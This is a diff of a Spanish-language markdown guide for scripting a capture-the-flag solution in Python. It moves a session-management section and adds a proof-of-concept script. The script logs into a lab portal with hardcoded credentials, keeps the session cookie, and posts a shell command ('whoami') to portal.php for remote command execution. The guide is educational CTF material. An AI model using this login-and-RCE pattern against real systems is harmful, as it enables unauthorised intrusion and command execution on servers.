@@ -86,7 +86,18 @@ El objetivo es **simular el comportamiento del navegador** mediante una petició
 - Envío de datos mediante POST
 - Manejo de respuestas HTTP
 
-Ejemplo conceptual usando la libreria requests para escribir las credenciales:
+# Fase 3 — Gestión de Sesión
+
+Después del login, el servidor genera una **cookie de sesión**.
+
+Para poder interactuar con otras secciones de la web es necesario **mantener esa sesión activa**.
+
+Ejemplo conceptual usando la libreria requests para escribir las credenciales + crear sesion:
+
+## Investigar
+
+- Cookies HTTP
+- Uso de sesiones en Python
 
 ```
 import requests as re
@@ -117,25 +128,6 @@ else:
 ```
 ---
 
-# Fase 3 — Gestión de Sesión
-
-Después del login, el servidor genera una **cookie de sesión**.
-
-Para poder interactuar con otras secciones de la web es necesario **mantener esa sesión activa**.
-
-## Investigar
-
-- Cookies HTTP
-- Uso de sesiones en Python
-
-Ejemplo conceptual:
-
-session = requests.Session()
-
-Esto permitirá reutilizar automáticamente las cookies recibidas tras el login.
-
----
-
 # Fase 4 — Análisis del Portal Vulnerable
 
 Durante la resolución manual del CTF se identificó que el portal permite **ejecutar comandos en el servidor**.
@@ -148,11 +140,48 @@ Debes analizar la petición que se envía cuando se introduce un comando.
 2. Ejecutar un comando simple.
 3. Observar la petición generada en la pestaña Network.
 
-Ejemplo conceptual:
+Ejemplo conceptual de RCE en el panel tras logearnos:
 
-POST /portal.php
+import requests as re
 
-command=ls
+# Se inicia la variable sesion para guardar las cookies
+sesion = re.Session()
+
+# Defino las constantes del PoC de requests + session
+LOGIN_ENDPOINT = 'http://10.128.167.86/login.php'
+CREDENCIALES = {
+        'username' : 'R1ckRul3s',
+        'password' : 'Wubbalubbadubdub',
+        'sub' : 'Login'
+}
+
+# Defino el ednpoint y el payload necesarios para RCE
+RCE_ENDPOINT = 'http://10.128.167.86/portal.php'
+PAYLOAD = {
+        'command' : 'whoami',
+        'sub': 'Execute'
+}
+
+# Ahora hay que acceder con el metodo POST (Endpoint + credenciales)
+estado_login = sesion.post(LOGIN_ENDPOINT,data = CREDENCIALES)
+
+# Se anaden las siguientes comprobaciones para verificar el resultado
+if estado_login.status_code == 200:
+        print('Peticion de login enviada. Verificando...')
+        if 'Command Panel' in estado_login.text:
+                print('Login exitoso! Mostrando las cookies de sesion:')
+                print(sesion.cookies)
+# Ahora tras un intento exitoso se va a probar a realizar RCE con POST y el Endpoint ()
+                rce_respuesta = sesion.post(RCE_ENDPOINT, data = PAYLOAD)
+                if rce_respuesta.status_code == 200:
+                        print('El comando se ha ejecutado satisfactoriamente. Resultado:')
+                        print(rce_respuesta.text)
+                else:
+                        print('Ha habido un error')
+        else:
+                print('Login fallido!')
+else:
+        print('Error de conexion!')
 
 ---
 
